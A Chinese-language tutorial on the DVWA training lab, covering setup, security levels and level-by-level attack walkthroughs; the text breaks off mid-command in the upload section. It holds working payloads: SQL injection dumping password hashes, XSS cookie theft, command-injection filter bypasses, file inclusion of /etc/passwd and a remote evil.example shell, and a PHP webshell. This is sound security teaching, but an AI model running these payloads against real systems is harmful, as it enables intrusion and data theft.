# dvwa（Damn Vulnerable Web Application：Web 漏洞靶场）

> **一句话**：一个「故意做得很不安全」的 PHP/MariaDB Web 应用，把 SQL 注入、XSS、命令注入、文件包含等经典漏洞各做成一个模块，每个模块有 low / medium / high / impossible 四个安全级别——**从「随便打就中」到「怎么打都不中」，一路把「漏洞长什么样、防御怎么写」同时学会**。
> **分类**：Web 应用 / 教学靶场 ｜ **Kali 包**：`dvwa`（命令 `dvwa-start`、`dvwa-stop`）｜ **官方文档**：<https://www.kali.org/tools/dvwa/> ｜ 上游：<https://github.com/digininja/DVWA>

---

## 1. 它解决什么问题

学 Web 安全最大的困境是：**没有合法、可控、可重复的靶子**。

- 拿真实站点练 → **违法**；
- 自己写一个 → 不知道要写哪些漏洞、怎么分级；
- 看教程不动手 → 记不住。

DVWA 解决的就是这件事：

| 需求 | DVWA 的答案 |
|------|-------------|
| 合法靶子 | **专门为「不安全」而生**，随便打 |
| 有梯度 | **四个安全级别**：low（无防护）→ medium（弱过滤）→ high（强过滤但有绕过）→ impossible（正确实现） |
| 可复现 | 一键重置数据库，任意重来 |
| 可对照 | 每个模块都有 **View Source**，**直接对照「有漏洞的代码」和「正确实现的代码」** |
| 覆盖全 | 18+ 模块覆盖 OWASP Top 10 的主要类别 |
| 配合工具 | 与 ZAP/Burp/sqlmap 等无缝配合（见 [`zaproxy.md`](zaproxy.md)、[`sqlmap.md`](sqlmap.md)） |

**对比同类靶场**：

| 靶场 | 定位 | 与 DVWA 的差异 |
|------|------|----------------|
| **DVWA** | **入门必做**：漏洞类型全覆盖，级别递进 | 单应用、PHP 栈；**最好的「第一站」** |
| **OWASP Juice Shop** | 现代 SPA（Angular）+ 完整 OWASP Top 10 | 更贴近现代架构、有评分榜；JS 栈，难度起点更高 |
| **bWAPP** | 100+ 漏洞，覆盖面最广 | 更杂更全，但界面与结构不如 DVWA 清晰 |
| **WebGoat** | OWASP 官方，教学式引导 + 课程 | 更像「课程」，有讲解；DVWA 更像「自己摸索」 |
| **Metasploitable 2** | 一整台**有漏洞的虚拟机**（含 DVWA） | 覆盖面是「整机」（服务 + Web）；DVWA 只专注 Web |
| **VulnHub / HTB** | 综合渗透靶机 | 需要完整渗透流程；DVWA 只练「Web 单点」 |

**一句话选型**：**入门练 Web 漏洞 → DVWA**；想更现代/更全 → Juice Shop / bWAPP；想练完整渗透链 → Metasploitable / VulnHub。

---

## 2. 工作原理

DVWA 的技术本质非常简单：**同一段功能的四份实现，安全性递增**。

```
                     dvwa 应用
                        │
        ┌───────────────┴──────────────────────┐
        ▼                                      ▼
   一个 SQL 模块（例：SQL Injection）      18+ 个模块
        │
        ├── source/low.php        ← 完全不做校验
        │     $id = $_REQUEST['id'];
        │     "SELECT ... WHERE user_id = '$id';"      ← 直接拼接
        │
        ├── source/medium.php     ← 弱过滤（看起来有防护）
        │     $id = mysqli_real_escape_string($link, $id);
        │     "SELECT ... WHERE user_id = $id;"         ← ⚠️ 没有引号了！
        │                                            （转义等于白做）
        │
        ├── source/high.php       ← 强过滤（但有绕过）
        │     输入来自 $_SESSION['id'] + LIMIT 1
        │     "SELECT ... WHERE user_id = '$id' LIMIT 1;"
        │
        └── source/impossible.php ← 正确实现
              checkToken(...)                           ← CSRF token
              if (is_numeric($id)) { $id = intval($id); } ← 类型白名单
              $db->prepare('... WHERE user_id = (:id) LIMIT 1;')
              $data->bindParam(':id', $id, PDO::PARAM_INT); ← 参数化查询
```

**这个「四份实现」结构就是 DVWA 的全部教学价值**：

1. **在 low 上把漏洞打通**（理解「原理」）；
2. **在 medium/high 上看防护是怎么加的、又是怎么被绕过的**（理解「防护的常见错误」）；
3. **在 impossible 上看正确实现**（学「怎么写才对」）；
4. **随时点 `View Source`** 对照四份源码——**这是 DVWA 最被低估的功能**。

**关键机制**：

- **安全级别存在 Cookie 里**：DVWA 把级别写在名为 `security` 的 Cookie 中（值：`low`/`medium`/`high`/`impossible`），页面每次读它。所以：**改了级别会立刻生效，无需重新登录**；反过来，**Cookie 可以被手动改**（这本身也是一个教学点）。
- **`impossible` 级别才做会话加固**：只有 `impossible` 会设置 `HttpOnly` + `SameSite=Strict` 并在登录时 `session_regenerate_id()`——其他三级都允许会话固定（session fixation）。**这是 DVWA 源码里能直接看出来的差异**。
- **每个模块的 `help` 页**：点击模块右下角 `View Help` 有该漏洞的说明与参考链接。
- **`View Source` 页**：可以分别查看 low/medium/high/impossible 四份源码，也可以 **View Source All** 一次看全部。
- **数据库**：`dvwa` 库，`users` 表（含 `user` / `password`(md5) / `avatar`）、`guestbook` 表（存 XSS 留言）。密码默认是 `admin:password`、`gordonb:abc123`、`1337:charley`、`pablo:letmein`、`smithy:password`。

---

## 3. 安装与快速上手

### 3.1 方式一：Kali 官方包（最简单）

```bash
sudo apt install dvwa
# 启动（会自动起 nginx + php-fpm + mariadb 的 dvwa.service）
sudo dvwa-start
```

```console
root@kali:~# sudo dvwa-start

┏━(Message from Kali developers)
┃
┃ Please wait for the dvwa service to start
┃
┃ [*] Web UI: http://127.0.0.1:42001
┃ [i] You might need to refresh your browser once it opens
┃
┗━

- Default User    : admin
- Default Password: password
```

```bash
sudo dvwa-stop          # 停止并查看服务状态
systemctl status dvwa    # 更详细的状态
```

**访问**：`http://127.0.0.1:42001`

**Kali 打包版本的路径**（便于找源码与配置）：

| 路径 | 内容 |
|------|------|
| `/usr/share/dvwa/` | 应用本体（含 `vulnerabilities/*/source/*.php`） |
| `/etc/dvwa/` 或 `config/` | 配置文件（数据库连接） |
| `/var/www/html/` | Web 根（Kali 版本可能软链到此处） |
| `systemd` | 服务名 `dvwa.service` |

### 3.2 方式二：Docker（**推荐，隔离最彻底**）

Docker 版本**不在 Kali 上装任何东西**，用完 `docker compose down` 就干净了。

```bash
# ① 确认 Docker / compose 可用
docker version
docker compose version

# ② 拉取源码（只是为了拿 compose.yml）
git clone https://github.com/digininja/DVWA.git /tmp/DVWA
cd /tmp/DVWA

# ③ 一条命令起来
docker compose up -d
docker compose ps
```

```console
root@kali:~# docker compose ps
NAME      IMAGE                        STATUS         PORTS
DVWA-db-1   mariadb:10                 Up (healthy)   3306/tcp
DVWA-dvwa-1 ghcr.io/digininja/dvwa:latest  Up        127.0.0.1:4280->80/tcp
```

**访问**：<http://localhost:4280>

> **注意端口是 4280 不是 80**（官方刻意的选择：80 端口容易冲突，且非 root 容器绑不了 <1024 的端口）。

**官方的 `compose.yml` 全文**（了解它做了什么，便于排查）：

```yaml
volumes:
  dvwa:

networks:
  dvwa:

services:
  dvwa:
    build: .
    image: ghcr.io/digininja/dvwa:latest
    # Change `always` to `build` to build from local source
    pull_policy: always
    environment:
      - DB_SERVER=db
    depends_on:
      - db
    # Uncomment the next 2 lines to serve local source
    # volumes:
    #   - ./:/var/www/html
    networks:
      - dvwa
    ports:
      - 127.0.0.1:4280:80          # 只绑本机回环！
    restart: unless-stopped

  db:
    image: docker.io/library/mariadb:10
    environment:
      - MYSQL_ROOT_PASSWORD=dvwa
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=p@ssw0rd
    volumes:
      - dvwa:/var/lib/mysql
    networks:
      - dvwa
    restart: unless-stopped
```

**如果你不想用 compose，等价的两条 `docker run`**：

```bash
# ① 建一个专用网络（让两个容器能互相解析名字）
docker network create dvwa-net

# ② 数据库
docker run -d --name dvwa-db --network dvwa-net \
  -e MYSQL_ROOT_PASSWORD=dvwa \
  -e MYSQL_DATABASE=dvwa \
  -e MYSQL_USER=dvwa \
  -e MYSQL_PASSWORD=p@ssw0rd \
  mariadb:10

# ③ Web 应用（等 10 秒让数据库初始化完）
sleep 10
docker run -d --name dvwa-web --network dvwa-net \
  -e DB_SERVER=dvwa-db \
  -p 127.0.0.1:4280:80 \
  ghcr.io/digininja/dvwa:latest
```

```bash
# 检查
docker ps
curl -s -o /dev/null -w '%{http_code}\n' http://localhost:4280/
```

**改端口 / 让局域网可访问**（做 Workshop 时）：

```yaml
# compose.yml 里改这一行
ports:
  - 127.0.0.1:8806:80      # 换个端口
#   - 8806:80              # 去掉 127.0.0.1 前缀 → 监听所有网卡（⚠️ 极不安全，见「法律与伦理」）
```

### 3.3 初始化（**必须做，否则所有模块都报数据库错误**）

浏览器打开 <http://localhost:4280> → 左侧菜单 **Setup DVWA** → 点击 **Create / Reset Database**。

```console
# 成功时的页面提示
Database has been created.
...
Setup successful!
```

**默认账号**：

| 用户名 | 密码 | 说明 |
|--------|------|------|
| `admin` | `password` | 主账号 |
| `gordonb` | `abc123` | |
| `1337` | `charley` | |
| `pablo` | `letmein` | |
| `smithy` | `password` | |

**登录**：`http://localhost:4280/login.php`（`admin` / `password`）

**数据库默认配置**（Docker 版由环境变量注入；手动安装版在 `config/config.inc.php`）：

```php
$_DVWA[ 'db_server' ]   = '127.0.0.1';
$_DVWA[ 'db_port' ]     = '3306';
$_DVWA[ 'db_user' ]     = 'dvwa';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
$_DVWA[ 'db_database' ] = 'dvwa';
```

**切换安全级别**：左侧菜单 **DVWA Security** → 选 `Low` / `Medium` / `High` / `Impossible` → Submit。

> 根路径下的 `index.php` 也能一键开始（PHP/MySQL 环境检查失败时先跑 `Setup DVWA`）。

---

## 4. 核心参数详解

DVWA 是 Web 应用，没有「命令行参数」。它的「参数」是**四个安全级别**和**一批模块**。这一节把这两张表讲清，后面实战才有章法。

### 4.1 四个安全级别（定义于源码 `dvwaPage.inc.php`）

```php
// Valid security levels
$security_levels = array('low', 'medium', 'high', 'impossible');
```

| 级别 | 设计意图 | 典型实现手法 | 会话加固 | 学习目标 |
|------|----------|--------------|----------|----------|
| **low** | **完全无防护** | 直接拼接/直接输出，无任何校验 | ❌ 无 | 理解漏洞**为什么能成立** |
| **medium** | **「看起来有防护」** | 黑名单/转义/sleep/客户端校验等**不完整**措施 | ❌ 无 | 理解**防护常见错误**（转义没用对、黑名单不全、只挡前端） |
| **high** | **「较强的防护」** | 白名单、正则过滤、token、`LIMIT 1`、服务端二次校验 | ❌ 无 | 理解**强过滤仍有绕过空间** |
| **impossible** | **正确实现** | 参数化查询、强制类型、CSRF token、输出编码、白名单 | ✅ `HttpOnly` + `SameSite=Strict` + 会话 ID 重生成 | **学「正确写法」** |

**会话加固的源码差异（只有 impossible 做了）**：

```php
if ($security_level == 'impossible') {
    $httponly = true;
    $samesite = "Strict";
} else {
    $httponly = false;
    $samesite = "";
}
```

以及登录时在 `impossible` 级别会 `session_regenerate_id()`——**这就是「会话固定」防护**。

**级别存哪里**：Cookie `security`。所以如果你发现「改了级别没生效」，检查浏览器 Cookie。

### 4.2 模块清单（对应 `vulnerabilities/` 下的目录）

| 目录 | 界面上叫什么 | 漏洞类型 | OWASP Top 10 (2021) |
|------|--------------|----------|---------------------|
| `brute` | Brute Force | 暴力破解 / 无速率限制 | A07 认证与鉴权失效 |
| `exec` | Command Injection | OS 命令注入 | A03 注入 |
| `csrf` | CSRF | 跨站请求伪造 | A01 访问控制失效 |
| `fi` | File Inclusion | 本地/远程文件包含（LFI/RFI） | A03 注入 |
| `upload` | File Upload | 任意文件上传 | A04 不安全设计 / A05 配置错误 |
| `sqli` | SQL Injection | SQL 注入 | A03 注入 |
| `sqli_blind` | SQL Injection (Blind) | 盲注（布尔/时间） | A03 注入 |
| `weak_id` | Weak Session IDs | 可预测的会话 ID | A07 认证与鉴权失效 |
| `xss_d` | XSS (DOM) | DOM 型 XSS | A03 注入 |
| `xss_r` | XSS (Reflected) | 反射型 XSS | A03 注入 |
| `xss_s` | XSS (Stored) | 存储型 XSS | A03 注入 |
| `csp` | CSP Bypass | CSP 策略绕过 | A05 配置错误 |
| `javascript` | JavaScript Attacks | 客户端校验被绕过 | A04 不安全设计 |
| `open_redirect` | Open HTTP Redirect | 开放重定向 | A01 访问控制失效 |
| `captcha` | Insecure CAPTCHA | 弱验证码流程 | A04 不安全设计 |
| `cryptography` | Cryptography | 弱加密/密钥管理 | A02 加密失败 |
| `bac` | Authorisation Bypass | 授权绕过（水平/垂直） | A01 访问控制失效 |
| `authbypass` | (Broken) Auth Bypass | 认证绕过 | A07 认证与鉴权失效 |
| `api` | API | API 安全问题 | A01/A03 等 |

> 模块列表以**你部署的版本**为准（新版本会新增；本文以 `master` 分支为准）。每个模块页面右下角有 `View Source` 与 `View Help`。

### 4.3 每个模块的「四个级别」怎么读

打开任意模块 → `View Source` → 你会看到四个级别的实现**并列**。**养成「先看源码再动手」的习惯**：

```
low.php        → 找出「输入从哪里来、去了哪里、没有任何处理」→ 直接构造 payload
medium.php     → 找出「做了什么过滤」→ 判断过滤是否完备 → 绕过
high.php       → 找出「过滤更强了」→ 找逻辑漏洞/编码绕过/协议绕过
impossible.php → 记住正确写法（参数化查询/白名单/输出编码/token）
```

---

## 5. 实战演练

> **环境声明**：**DVWA 是故意不安全的，必须只在本地/隔离网络运行**。
> - **绝对不要**部署到公网、云主机、公司内网开放访问（官方原文就警告：「不要把它上传到你的主机提供商的 public_html 或任何面向互联网的服务器，否则它们会被攻陷」）；
> - 优先用 **Docker + `127.0.0.1` 绑定**（`compose.yml` 默认就是这么做的）；
> - 本文所有练习**只针对你自己起的 DVWA 实例**；把同样的 payload 打到别的站点就是犯罪；
> - 建议在**一次性虚拟机**里做，练完 `docker compose down -v` 清干净。

### 场景 1：起靶场、初始化、理解级别切换

```bash
# ① 起容器（推荐 Docker）
git clone https://github.com/digininja/DVWA.git /tmp/DVWA
cd /tmp/DVWA && docker compose up -d
sleep 10
curl -s -o /dev/null -w 'HTTP %{http_code}\n' http://localhost:4280/
```

```console
HTTP 200
```

```bash
# ② 初始化数据库（等价于在浏览器点按钮）
curl -s -c /tmp/dvwa.cookie -b /tmp/dvwa.cookie http://localhost:4280/setup.php >/dev/null
# 用浏览器做更直观：打开 http://localhost:4280 → Setup DVWA → Create / Reset Database
```

**在浏览器里**：

1. 打开 <http://localhost:4280/setup.php> → **Create / Reset Database** → 看到 `Setup successful!`
2. 打开 <http://localhost:4280/login.php> → 用 `admin` / `password` 登录
3. 左侧菜单 → **DVWA Security** → 选 **Low** → **Submit**
4. 左侧菜单 → **SQL Injection** → 右下角点 **View Source** → 看到 `low.php` 的实现

```console
# ③ 用命令行验证「级别存在 Cookie 里」
curl -s -b 'security=low; PHPSESSID=<你的会话>' http://localhost:4280/vulnerabilities/sqli/ | grep -o 'Security Level:.*' | head -1
```

**解读**：**DVWA Security 页面把级别写进 `security` Cookie**。因此：

| 现象 | 原因 |
|------|------|
| 改级别立刻生效 | 页面每次都读 Cookie |
| 换浏览器后级别回到默认 | Cookie 不共享 |
| 手动改 Cookie 也能切级别 | 服务端信任客户端 Cookie（**这本身是个教学点**：安全状态不能放客户端） |
| 会话固定攻击可行（low/medium/high） | 只有 `impossible` 才 `session_regenerate_id()` |

**别忘了重置**：任何模块被玩坏了（比如 CSRF 改了 admin 密码、上传了 webshell），都可以回 **Setup DVWA → Create / Reset Database** 一键复原。

### 场景 2：按难度逐级练（核心内容）

> 下面每个漏洞都按 **low → medium → high → impossible** 走一遍。**每一步都先点 `View Source` 看代码**——看懂代码比记住 payload 重要 100 倍。

#### 2.1 SQL Injection（`sqli`）

**Low**

源码：
```php
$id = $_REQUEST[ 'id' ];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

**输入被直接塞进单引号里**，用引号就能逃逸。

```bash
# 正常请求
curl -s 'http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit' -b '<cookie>' | grep -A2 'ID:'
```
```
ID: 1
First name: admin
Surname: admin
```

```bash
# 注入：让 WHERE 恒真，返回全部用户
curl -s --get 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' -b '<cookie>' | grep -c 'First name:'
```

```console
5        ← 返回了 5 个用户（原本只有 1 个）
```

```bash
# 进阶：联合查询把账号密码捞出来（users 表有 5 列，所以 UNION 要 2 列）
curl -s --get 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode "id=1' UNION SELECT user, password FROM users #" \
     --data-urlencode 'Submit=Submit' -b '<cookie>' | grep -E 'First name|Surname'
```

```console
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99      ← md5("password")
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03      ← md5("abc123")
...
```

**验证方法**：`grep -c 'First name:'` 的数量从 1 变 5；或者响应里出现别的用户名。

**Medium**

源码：
```php
$id = $_POST[ 'id' ];
$id = mysqli_real_escape_string($link, $id);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";   // ← 没有引号！
```

**这是最重要的一课**：它「做了转义」，但**同时把 SQL 里的引号删掉了**。转义只对「引号内」有意义——**没有引号时转义是无效的**。

```bash
# 直接提交数字表达式即可，一个引号都不用
curl -s 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode 'id=1 OR 1=1' --data-urlencode 'Submit=Submit' -b '<cookie>' \
     | grep -c 'First name:'
```

```console
5
```

```bash
# 联合查询同样不需要引号
curl -s 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode 'id=1 UNION SELECT user,password FROM users' \
     --data-urlencode 'Submit=Submit' -b '<cookie>' | grep -E 'First name|Surname' | head -4
```

> **注意**：medium 的表单在页面上是个 `<select>` 下拉框——**浏览器只会让你选 1-5**。所以这一关还教你「**客户端限制不等于服务端限制**」：直接用 ZAP/Burp 拦截改 POST，或用 `curl` 直接构造请求即可绕过下拉框。
>
> 用 ZAP 的话：`History` 里找到该请求 → 右键 **Open/Resend with Request Editor** → 把 `id=1` 改成 `1 OR 1=1` → Send。

**High**

源码：
```php
$id = $_SESSION[ 'id' ];            // 输入不来自请求，而来自「会话」
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
```

**变化点有两个**：
1. 输入来自**另一个页面**写入 `$_SESSION['id']`（页面上有「Change your ID」按钮）；
2. 加了 `LIMIT 1`——**一次只能拿到一行**，盲注以外的「一次捞全表」不再直接可行。

```bash
# ① 先在「设置会话 id」的表单里注入（输入点在这里！）
curl -s 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode "id=1' UNION SELECT user,password FROM users #" \
     --data-urlencode 'Submit=Submit' -b '<cookie>' >/dev/null
# ② 再点查询按钮触发
curl -s 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode 'Submit=Submit' -b '<cookie>' | grep -E 'First name|Surname'
```

**解读**：
- `#` 把后面 `' LIMIT 1;` **注释掉**了，所以 `LIMIT 1` 不生效（查询单行时 `#` 注释有效——整个 SQL 在一行里）；
- **「输入来自哪里」比「怎么绕过过滤」更重要**：high 级别**根本没有过滤输入**，只是换了个入口（session）并加了 `LIMIT`。**这是一次「想清楚数据流」的训练**。

**Impossible**

源码：
```php
checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  // CSRF token
if (is_numeric( $id )) {
    $id = intval ($id);                                                             // 强制整数
    $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
    $data->bindParam( ':id', $id, PDO::PARAM_INT );                                  // 参数化
}
```

**验证方法（怎么证明「打不动」）**：

```bash
# 直接发注入 payload：因为 is_numeric 不通过，页面什么都不显示
curl -s --get 'http://localhost:4280/vulnerabilities/sqli/' \
     --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' -b '<cookie>' | grep -c 'First name:'
```

```console
0        ← 没有输出（is_numeric 直接拦掉了）
```

**记住这四点（写代码时照着做）**：
1. **参数化查询**（`prepare` + `bindParam`）——**唯一真正有效的方案**；
2. **类型白名单**（`is_numeric` + `intval`）；
3. **CSRF token**；
4. **不信任客户端**。

#### 2.2 XSS (Reflected)（`xss_r`）

**Low** 源码：`$html .= "<pre>Hello {$name}</pre>";`（原样输出）

```bash
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<script>alert(1)</script>' -b '<cookie>' | grep -o 'Hello.*'
```
```console
Hello <script>alert(1)</script>
```
→ 浏览器里弹窗 = 反射型 XSS 成立。

**Medium** 源码：
```php
$name = str_replace( '<script>', '', $_GET[ 'name' ] );
```
**只删小写的 `<script>`**，且**只删一次**：

```bash
# ① 换大小写
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<sCrIpT>alert(1)</sCrIpT>' -b '<cookie>' | grep -o 'Hello.*'
# ② 或者干脆不用 script 标签
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<img src=x onerror=alert(1)>' -b '<cookie>' | grep -o 'Hello.*'
# ③ 嵌套绕过（str_replace 只删一次）
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<scr<script>ipt>alert(1)</script>' -b '<cookie>' | grep -o 'Hello.*'
```

**解读**：`str_replace` 是**大小写敏感、非递归**的——**黑名单永远做不完整**。

**High** 源码：
```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
```
**这个正则能匹配任意大小写、且允许中间插任意字符**——所以 `<sCrIpT>` 和 `<scr<script>ipt>` 都被干掉了。**但它只挡 `script` 关键字**：

```bash
# 换一个不需要 <script> 的标签
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<img src=x onerror=alert(1)>' -b '<cookie>' | grep -o 'Hello.*'
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<svg onload=alert(1)>' -b '<cookie>' | grep -o 'Hello.*'
```

**解读**：**「只过滤 `<script>`」是典型的黑名单思维**——XSS 的执行点远不止 `<script>`（`onerror`/`onload`/`javascript:`/`<iframe srcdoc>`…）。

**Impossible** 源码：`$name = htmlspecialchars( $name );` + token

```bash
curl -s --get 'http://localhost:4280/vulnerabilities/xss_r/' \
     --data-urlencode 'name=<script>alert(1)</script>' -b '<cookie>' | grep -o 'Hello.*'
```
```console
Hello &lt;script&gt;alert(1)&lt;/script&gt;
```
→ **输出编码**把 `<`/`>` 变成实体，浏览器不再当标签解析。**这才是正确的防御**（在「输出到 HTML 上下文」时做 HTML 实体编码）。

#### 2.3 XSS (Stored)（`xss_s`）

与反射型的区别：**payload 存进数据库，任何访问该页面的人都会中招**（无需诱导点链接）。留言板（`guestbook` 表）就是入口。

```bash
# Low：直接在 Message 里放 payload
curl -s 'http://localhost:4280/vulnerabilities/xss_s/' \
     --data-urlencode 'txtName=tester' \
     --data-urlencode 'mtxMessage=<script>alert(document.cookie)</script>' \
     --data-urlencode 'btnSign=Sign Guestbook' -b '<cookie>' >/dev/null
# 然后重新加载页面，脚本就会执行（每次访问都执行！）
curl -s 'http://localhost:4280/vulnerabilities/xss_s/' -b '<cookie>' | grep -o '<script>alert(document.cookie)</script>'
```

**验证与理解**：

| 级别 | 防护 | 绕过 |
|------|------|------|
| Low | 无 | 直接 `<script>...` |
| Medium | 对 `txtName` 用 `strip_tags` + 长度截断；对 `mtxMessage` 用 `htmlspecialchars` 但**长度只有 50** | **短信字段**（`txtName`）可能仍可注入；或利用**长度限制内的短 payload** |
| High | `strip_tags` + 严格的 `htmlspecialchars`（`ENT_QUOTES`）+ token | 基本打不动（**但要自己看源码确认**） |
| Impossible | 上述 + token | 打不动 |

```bash
# 每次访问都执行 —— 这就是「存储型」的可怕之处
for i in 1 2 3; do curl -s 'http://localhost:4280/vulnerabilities/xss_s/' -b '<cookie>' | grep -c 'alert('; done
```

**解读**：存储型 XSS 的**危害等级远高于反射型**——它不需要社工，任何访问者（**包括管理员**）都会被打。这也是「XSS 拿到管理员 Cookie → 进后台」这条经典链的起点。

#### 2.4 Command Injection（`exec`）

**Low** 源码：`shell_exec('ping -c 4 ' . $target)`，`$target` 未处理。

```bash
curl -s 'http://localhost:4280/vulnerabilities/exec/' \
     --data-urlencode 'ip=127.0.0.1; id; uname -a' --data-urlencode 'Submit=Submit' -b '<cookie>' \
     | grep -E 'uid=|Linux'
```

```console
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux <container-id> ... x86_64 GNU/Linux
```

**Medium** 源码：
```php
$substitutions = array( '&&' => '', ';' => '' );
$target = str_replace( array_keys($substitutions), $substitutions, $target );
```
**黑名单只有 `&&` 和 `;`**：

```bash
# 用单 & 或管道
curl -s 'http://localhost:4280/vulnerabilities/exec/' \
     --data-urlencode 'ip=127.0.0.1 | id' --data-urlencode 'Submit=Submit' -b '<cookie>' | grep 'uid='
curl -s 'http://localhost:4280/vulnerabilities/exec/' \
     --data-urlencode 'ip=127.0.0.1 & id' --data-urlencode 'Submit=Submit' -b '<cookie>' | grep 'uid='
```

**High** 源码：
```php
$substitutions = array( '||'=>'', '&'=>'', ';'=>'', '| '=>'', '-'=>'', '$'=>'', '('=>'', ')'=>'', '`'=>'' );
```
**注意 `'| '` 是「竖线+空格」**——所以**不带空格的 `|` 就能绕过**：

```bash
curl -s 'http://localhost:4280/vulnerabilities/exec/' \
     --data-urlencode 'ip=127.0.0.1|id' --data-urlencode 'Submit=Submit' -b '<cookie>' | grep 'uid='
# 换行符同样可行（%0a）
curl -s 'http://localhost:4280/vulnerabilities/exec/' \
     --data-urlencode $'ip=127.0.0.1\nid' --data-urlencode 'Submit=Submit' -b '<cookie>' | grep 'uid='
```

**解读**：high 的过滤已经很细了（连 `$`、`(`、`)`、反引号都挡了），**但漏了一个「不带空格的管道符」**。这是黑名单的典型失败——**你永远列不全所有注入字符**。

**Impossible**：把输入切成四段、每段必须 `is_numeric`，再用 `escapeshellarg()` + 白名单。**正确做法**：**不调用 shell**（用语言内置函数 / 参数数组 exec），**或**严格白名单 + 转义。

#### 2.5 File Inclusion（`fi`）

**Low**：`$file = $_GET['page'];` 直接 include。

```bash
# LFI：读系统文件
curl -s 'http://localhost:4280/vulnerabilities/fi/?page=../../../../etc/passwd' -b '<cookie>' | grep -m1 'root:'
```
```console
root:x:0:0:root:/root:/bin/bash
```

```bash
# RFI：包含远程文件（需要 allow_url_include=On）
curl -s 'http://localhost:4280/vulnerabilities/fi/?page=http://evil.example/shell.txt' -b '<cookie>'
```

**检查 RFI 是否可用**：

```bash
curl -s 'http://localhost:4280/phpinfo.php' -b '<cookie>' | grep -i 'allow_url_include' || \
curl -s 'http://localhost:4280/vulnerabilities/fi/' -b '<cookie>' | grep -i 'allow_url'
```

**Medium** 源码：
```php
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\\" ), "", $file );
```
**两次「删一次」的字符串替换**：

```bash
# ① 目录穿越：把 ../ 写成 ....//（删掉中间的 ../ 后剩下 ../）
curl -s 'http://localhost:4280/vulnerabilities/fi/?page=....//....//....//....//etc/passwd' -b '<cookie>' | grep -m1 'root:'
# ② 协议绕过：把 http:// 写成 hthttp://tp://（删掉 http:// 后剩下 http://）
curl -s 'http://localhost:4280/vulnerabilities/fi/?page=hthttp://tp://evil.example/shell.txt' -b '<cookie>'
```

**High** 源码：
```php
if ( !fnmatch( "file*", $file ) && $file != "include.php" ) { echo "ERROR: File not found!"; exit; }
```
**只允许以 `file` 开头的字符串** —— 用 **PHP 的 `file://` 协议包装器**：

```bash
curl -s 'http://localhost:4280/vulnerabilities/fi/?page=file:///etc/passwd' -b '<cookie>' | grep -m1 'root:'
```

**解读**：high 的白名单「以 `file` 开头」拦住了普通路径，**但没考虑协议包装器**。**正确做法是「白名单固定的文件名集合」（impossible 就是这么做的），而不是「前缀匹配」。**

#### 2.6 File Upload（`upload`）

**Low** 源码：直接 `move_uploaded_file()`，**无任何检查**。

```bash
# 造一个 PHP webshell（仅用于本地靶场！）
printf '<?php if(isset($_REQUEST["c"])){ system($_REQUEST["c"]); } ?>' > /tmp/shell.php
curl -s -F 'uploaded=@/tmp/shell.php;type=image/jpeg' \
     -F 'Upload=Upload' 'http://localhost:4280/vulnerabilities/upload/' -b '<cookie>' | grep -o 'hackable/uploads/.*'
```

```console
hackable/uploads/shell.php succesfully uploaded!
```

```bash
# 验证：执行命令
curl -s 'http://localhost:4280/hackable/uploads/shell.php' --data 'c=id' -b '<cookie>'
```
```console
uid=33(www-data) gid=33(www-data) ...
```

**Medium** 源码：
```php
if ( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) && ( $uploaded_size < 100000 ) ) { ... }
```
**只检查「客户端提交的 MIME 类型」**（`$_FILES['uploaded']['type']`），**而这个值是请求里带的、可以随便改**：

```bash
# 还是传 PHP 文件，只把 Content-Type 改成 image/jpeg
curl -s -F 'uploaded=@/tmp/shell.php;type=image/jpeg' \
     -F 'Upload=Upload' 'http://localhost:4280/vulnerabilities/upload/' -b '<cookie>' | grep -o 'hackable/uploads/.*'
```
→ 依然上传成功。**「信任客户端的 Content-Type」是文件上传防护的经典错误**。

**High** 源码：
```php
$uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
if ( ( strtolower($uploaded_ext) == "jpg" || ... == "jpeg" || ... == "png" )
     && ( $uploaded_size < 100000 ) && getimagesize( $uploaded_tmp ) ) { ... }
```
**这次是服务端检查**：扩展名白名单 + `getimagesize()`（**真的去解析文件头**）。**这已经很接近正确了**：

```bash
# ① 改扩展名骗不过（ext 检查）
# ② 纯 PHP 文件骗不过 getimagesize
# ③ 常见绕过思路：「图片马」——在合法图片后追加 PHP 代码（getimagesize 会通过）
printf '\xff\xd8\xff\xe0' > /tmp/pic.php.jpg      # 伪造 JPEG 头（示意）
cat /tmp/shell.php >> /tmp/pic.php.jpg
curl -s -F 'uploaded=@/tmp/pic.php.jpg;type=image/jpeg' -F 'Upload=Upload' \
